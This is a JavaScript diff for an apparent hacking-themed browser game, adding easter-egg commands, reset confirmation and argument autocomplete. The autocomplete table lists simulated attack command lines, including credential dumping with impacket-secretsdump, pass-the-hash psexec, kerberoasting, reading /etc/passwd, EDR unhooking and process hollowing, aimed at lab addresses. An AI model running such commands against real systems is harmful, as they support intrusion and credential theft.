+    print(`│  [${state.codeWritten ? '✓' : ' '}] HolyC code written            │`, state.codeWritten ? 'success' : 'system');
+    print(`│  [${state.compiled ? '✓' : ' '}] Code compiled                  │`, state.compiled ? 'success' : 'system');
+    print(`│  [${state.ran ? '✓' : ' '}] Program executed               │`, state.ran ? 'success' : 'system');
+    print(`│  [${state.transcended ? '✓' : ' '}] Transcendence achieved        │`, state.transcended ? 'success' : 'system');
+    print('└─────────────────────────────────────┘', 'highlight');
+    print('', '');
+    return;
+  }
+
+  if (cmd === 'hint') {
+    print('', '');
+    print('💡 DIVINE HINT:', 'warning');
+    if (!state.prayed && !state.codeWritten) {
+      print('Seek guidance through prayer to understand HolyC.', 'info');
+      print('Try: pray', 'success');
+    } else if (!state.codeWritten) {
+      print('Write HolyC code to calculate the sum of primes below 1000.', 'info');
+      print('Try: holyc', 'success');
+    } else if (!state.compiled) {
+      print('Your code needs to be compiled by the divine compiler.', 'info');
+      print('Try: compile', 'success');
+    } else if (!state.ran) {
+      print('Execute your divine computation.', 'info');
+      print('Try: run', 'success');
+    } else {
+      print('You have completed the computation! Ascend!', 'info');
+      print('Try: transcend', 'success');
+    }
+    print('', '');
     return;
   }
 
@@ -2303,7 +6435,49 @@ async function handleLevel6Command(cmd, args) {
 // ============================================
 // COMMAND PROCESSING
 // ============================================
-const globalCommands = ['help', 'menu', 'levels', 'start', 'next', 'reset', 'clear', 'exit'];
+const globalCommands = ['help', 'menu', 'levels', 'start', 'continue', 'next', 'reset', 'reset confirm', 'clear', 'stats', 'exit'];
+
+// Secret global easter egg commands
+const secretCommands = ['matrix', 'hack', 'sudo', 'rm -rf'];
+
+async function handleSecretCommand(cmd) {
+  if (cmd === 'matrix') {
+    print(ASCII.matrix, 'ascii');
+    await matrixRain(4000);
+    print('Wake up, Neo...', 'highlight');
+    addEasterEgg('secret_matrix', 'You took the red pill. Welcome to the real world.');
+    return true;
+  }
+
+  if (cmd === 'hack') {
+    await glitchText('INITIALIZING HACK SEQUENCE...', 8);
+    await sleep(500);
+    print(ASCII.hacker2, 'ascii');
+    print('Just kidding. This is a game, not a crime.', 'warning');
+    return true;
+  }
+
+  if (cmd === 'sudo') {
+    print('', '');
+    print('[sudo] password for ' + gameState.hackerName + ':', 'system');
+    await sleep(1500);
+    print('Nice try. You\'re not root here.', 'error');
+    print('', '');
+    return true;
+  }
+
+  if (cmd === 'rm -rf' || cmd.startsWith('rm -rf')) {
+    print('', '');
+    await glitchText('DELETING SYSTEM FILES...', 10);
+    await sleep(800);
+    print('Just kidding! That would be mean.', 'success');
+    print('But seriously, don\'t run that on a real system.', 'warning');
+    print('', '');
+    return true;
+  }
+
+  return false;
+}
 
 function getCurrentCommands() {
   if (!gameState.inLevel) {
@@ -2333,7 +6507,7 @@ function handleNameInput(name) {
   return true;
 }
 
-function processCommand(input) {
+async function processCommand(input) {
   const trimmed = input.trim();
   if (!trimmed) return;
 
@@ -2353,6 +6527,11 @@ function processCommand(input) {
   gameState.historyIndex = -1;
 
   playEnter();
+
+  // Check for secret commands first (easter eggs work anywhere)
+  if (await handleSecretCommand(trimmed.toLowerCase())) {
+    return;
+  }
 
   // Global commands
   if (cmd === 'clear') {
@@ -2386,13 +6565,26 @@ function processCommand(input) {
   if (!gameState.inLevel) {
     // Menu commands
     if (cmd === 'help') {
-      print('Commands:', 'info');
-      print('  continue - Resume saved level progress', 'system');
-      print('  start    - Start from level 1 or next incomplete', 'system');
-      print('  levels   - Select a level', 'system');
-      print('  stats    - View your hacker stats', 'system');
-      print('  reset    - Reset all progress', 'system');
-      print('  clear    - Clear terminal', 'system');
+      print('', '');
+      print('╔════════════════════════════════════════════════════════════╗', 'info');
+      print('║                    MAIN MENU COMMANDS                      ║', 'info');
+      print('╠════════════════════════════════════════════════════════════╣', 'info');
+      print('║  GAMEPLAY:                                                 ║', 'info');
+      print('║    start      Begin from level 1 or next incomplete       ║', 'system');
+      print('║    continue   Resume saved level progress                 ║', 'system');
+      print('║    levels     Select a specific level to play             ║', 'system');
+      print('║                                                            ║', 'info');
+      print('║  PROFILE:                                                  ║', 'info');
+      print('║    stats      View your hacker stats and score            ║', 'success');
+      print('║    reset      Reset all progress (with confirmation)      ║', 'warning');
+      print('║                                                            ║', 'info');
+      print('║  UTILITY:                                                  ║', 'info');
+      print('║    clear      Clear terminal output                       ║', 'system');
+      print('║    help       Show this help message                      ║', 'system');
+      print('╚════════════════════════════════════════════════════════════╝', 'info');
+      print('', '');
+      print('💡 TIP: There are secret commands hidden throughout the game...', 'system');
+      print('', '');
       return;
     }
 
@@ -2427,9 +6619,47 @@ function processCommand(input) {
     }
 
     if (cmd === 'reset') {
+      print('', '');
+      print('⚠️  WARNING: This will reset ALL progress!', 'error');
+      print('', '');
+      print('Type "reset confirm" to confirm, or anything else to cancel.', 'warning');
+      return;
+    }
+
+    if (cmd === 'reset' && args[0] === 'confirm') {
+      // Full reset
       gameState.levelsCompleted = [];
+      gameState.currentLevel = 0;
+      gameState.levelState = {};
+      gameState.inLevel = false;
+      gameState.attempts = 0;
+      gameState.score = 0;
+      gameState.easterEggsFound = [];
+      // Keep hackerName - don't reset identity
       saveGame();
-      print('Progress reset.', 'warning');
+      print('', '');
+      print(ASCII.skull, 'ascii');
+      print('All progress has been reset.', 'warning');
+      print(`Your identity (${gameState.hackerName}) has been preserved.`, 'info');
+      print('', '');
+      return;
+    }
+
+    // Handle "reset confirm" as two-word command
+    if (trimmed.toLowerCase() === 'reset confirm') {
+      gameState.levelsCompleted = [];
+      gameState.currentLevel = 0;
+      gameState.levelState = {};
+      gameState.inLevel = false;
+      gameState.attempts = 0;
+      gameState.score = 0;
+      gameState.easterEggsFound = [];
+      saveGame();
+      print('', '');
+      print(ASCII.skull, 'ascii');
+      print('All progress has been reset.', 'warning');
+      print(`Your identity (${gameState.hackerName}) has been preserved.`, 'info');
+      print('', '');
       return;
     }
 
@@ -2451,8 +6681,43 @@ function processCommand(input) {
 let autocompleteIndex = 0;
 let autocompleteItems = [];
 
+// Enhanced autocomplete with subcommand support
+const COMMAND_ARGUMENTS = {
+  // Level 1
+  'nmap': ['192.168.1.100', '-sV', '-sC', '-p-'],
+  'gobuster': ['192.168.1.100', 'dir -u http://192.168.1.100'],
+  'curl': ['http://192.168.1.100', 'http://192.168.1.100/robots.txt', 'http://192.168.1.100/backup/creds.txt', 'http://192.168.1.100/admin'],
+  'ssh': ['admin@192.168.1.100', 'root@192.168.1.100'],
+  'cat': ['user.txt', 'flag.txt', '/etc/passwd'],
+  // Level 2
+  'crackmapexec': ['smb 10.10.10.50', 'smb 10.10.10.100'],
+  'smbclient': ['//10.10.10.50/IT_Backup', '//10.10.10.50/Users', '-L 10.10.10.50'],
+  'hashcat': ['-m 1000 hash.txt', '-m 13100 ticket.txt'],
+  'evil-winrm': ['-i 10.10.10.100 -u svc_backup -p Backup2023!'],
+  // Level 3
+  'bloodhound-python': ['-d MEGACORP.LOCAL -u svc_backup -p Backup2023! -c all'],
+  'rubeus': ['kerberoast', 'asreproast', 'harvest'],
+  'impacket-secretsdump': ['MEGACORP.LOCAL/svc_sql:SQLAdmin2023!@10.10.10.100'],
+  'impacket-psexec': ['Administrator@10.10.10.100 -hashes :a87f3a337d73085c45f9416be5787d86'],
+  // Level 4
+  'unhook': ['ntdll', 'ntdll.dll', 'kernel32'],
+  'obfuscate': ['xor', 'aes', 'uuid'],
+  'hollow': ['svchost', 'RuntimeBroker', 'dllhost', 'explorer'],
+  'inject': ['early-bird', 'apc', 'thread-hijack'],
+  // Level 5
+  'disasm': ['WriteMemory', '0x222010', 'AllocatePool', 'ReadMemory'],
+  'ioctl': ['0x222014', '0x222010', '0x22200C'],
+  'alloc': ['0x1000', '0x2000', '0x4000'],
+  'write': ['pool shellcode'],
+  // Level 6
+  'holyc': ['--edit', '--template'],
+  'compile': ['main.hc'],
+  'run': ['main.hc']
+};
+
 function updateAutocomplete() {
-  const value = input.value.trim().toLowerCase();
+  const value = input.value.trim();
+  const valueLower = value.toLowerCase();
   const commands = getCurrentCommands();
 
   if (!value) {
@@ -2460,12 +6725,29 @@ function updateAutocomplete() {
     return;
   }
 
-  autocompleteItems = commands.filter(c => c.startsWith(value) && c !== value);
+  // Check if we're completing a command or an argument
+  const parts = value.split(/\s+/);
+  const baseCmd = parts[0].toLowerCase();
+
+  if (parts.length === 1) {
+    // Completing base command
+    autocompleteItems = commands.filter(c => c.toLowerCase().startsWith(valueLower) && c.toLowerCase() !== valueLower);
+  } else {
+    // Completing argument - check if we have suggestions for this command
+    const argSuggestions = COMMAND_ARGUMENTS[baseCmd] || [];
+    const currentArg = parts.slice(1).join(' ').toLowerCase();
+
+    autocompleteItems = argSuggestions
+      .filter(arg => arg.toLowerCase().startsWith(currentArg) || (currentArg === '' && arg))
+      .map(arg => baseCmd + ' ' + arg);
+  }
 
   if (autocompleteItems.length === 0) {
     autocomplete.style.display = 'none';
     return;
   }
+
+  autocompleteIndex = Math.min(autocompleteIndex, autocompleteItems.length - 1);
 
   autocomplete.innerHTML = '';
   autocompleteItems.forEach((item, idx) => {
@@ -2473,8 +6755,9 @@ function updateAutocomplete() {
     div.className = 'autocomplete-item' + (idx === autocompleteIndex ? ' selected' : '');
     div.textContent = item;
     div.onclick = () => {
-      input.value = item + ' ';
+      input.value = item + (item.includes(' ') ? '' : ' ');
       autocomplete.style.display = 'none';
+      autocompleteIndex = 0;
       input.focus();
     };
     autocomplete.appendChild(div);
@@ -2495,8 +6778,9 @@ input.addEventListener('keydown', (e) => {
   if (e.key === 'Tab') {
     e.preventDefault();
     if (autocompleteItems.length > 0) {
-      input.value = autocompleteItems[autocompleteIndex] + ' ';
+      input.value = autocompleteItems[autocompleteIndex] + (autocompleteItems[autocompleteIndex].includes(' ') ? '' : ' ');
       autocomplete.style.display = 'none';
+      autocompleteIndex = 0;
     }
     return;
   }
@@ -2504,46 +6788,56 @@ input.addEventListener('keydown', (e) => {
   // Enter
   if (e.key === 'Enter') {
     e.preventDefault();
+    // If autocomplete is showing and item is selected, use that first
+    if (autocomplete.style.display === 'block' && autocompleteItems.length > 0) {
+      input.value = autocompleteItems[autocompleteIndex] + (autocompleteItems[autocompleteIndex].includes(' ') ? '' : ' ');
+      autocomplete.style.display = 'none';
+      autocompleteIndex = 0;
+      return;
+    }
     autocomplete.style.display = 'none';
     processCommand(input.value);
     input.value = '';
+    autocompleteIndex = 0;
     return;
   }
 
-  // History navigation
+  // Arrow key navigation - autocomplete takes priority
   if (e.key === 'ArrowUp') {
     e.preventDefault();
-    if (gameState.commandHistory.length > 0) {
-      gameState.historyIndex = Math.min(gameState.historyIndex + 1, gameState.commandHistory.length - 1);
-      input.value = gameState.commandHistory[gameState.historyIndex];
+    if (autocomplete.style.display === 'block' && autocompleteItems.length > 0) {
+      // Navigate autocomplete
+      autocompleteIndex = Math.max(0, autocompleteIndex - 1);
+      updateAutocomplete();
+    } else {
+      // Navigate command history
+      if (gameState.commandHistory.length > 0) {
+        gameState.historyIndex = Math.min(gameState.historyIndex + 1, gameState.commandHistory.length - 1);
+        input.value = gameState.commandHistory[gameState.historyIndex];
+        updateAutocomplete();
+      }
     }
     return;
   }
 
   if (e.key === 'ArrowDown') {
     e.preventDefault();
-    if (gameState.historyIndex > 0) {
-      gameState.historyIndex--;
-      input.value = gameState.commandHistory[gameState.historyIndex];
+    if (autocomplete.style.display === 'block' && autocompleteItems.length > 0) {
+      // Navigate autocomplete
+      autocompleteIndex = Math.min(autocompleteItems.length - 1, autocompleteIndex + 1);
+      updateAutocomplete();
     } else {
-      gameState.historyIndex = -1;
-      input.value = '';
+      // Navigate command history
+      if (gameState.historyIndex > 0) {
+        gameState.historyIndex--;
+        input.value = gameState.commandHistory[gameState.historyIndex];
+        updateAutocomplete();
+      } else {
+        gameState.historyIndex = -1;
+        input.value = '';
+        autocomplete.style.display = 'none';
+      }
     }
-    return;
-  }
-
-  // Autocomplete navigation
-  if (e.key === 'ArrowUp' && autocomplete.style.display === 'block') {
-    e.preventDefault();
-    autocompleteIndex = Math.max(0, autocompleteIndex - 1);
-    updateAutocomplete();
-    return;
-  }
-
-  if (e.key === 'ArrowDown' && autocomplete.style.display === 'block') {
-    e.preventDefault();
-    autocompleteIndex = Math.min(autocompleteItems.length - 1, autocompleteIndex + 1);
-    updateAutocomplete();
     return;
   }
 
@@ -2554,6 +6848,7 @@ input.addEventListener('keydown', (e) => {
       return;
     }
     autocomplete.style.display = 'none';
+    autocompleteIndex = 0;
     return;
   }
 });
@@ -2576,5 +6871,24 @@ document.getElementById('game-container').addEventListener('click', () => {
 // INIT
 // ============================================
 loadGame();
-showMainMenu();
+
+// Check if we were in the middle of a level (e.g., page refresh during play)
+if (gameState.inLevel && gameState.currentLevel > 0 && Object.keys(gameState.levelState).length > 0) {
+  // Resume the level with existing state
+  console.log('[GameState] Resuming level', gameState.currentLevel, 'from saved state');
+  startLevel(gameState.currentLevel, true); // true = continue with existing state
+} else {
+  showMainMenu();
+}
+
+// Enable visual effects
+setTimeout(() => {
+  if (typeof GameEngine !== 'undefined') {
+    GameEngine.effects.scanlines(true);
+  }
+}, 1000);
 </script>
+
+<!-- Include game engine and utilities -->
+{% include game/engine.html %}
+{% include game/utils.html %}
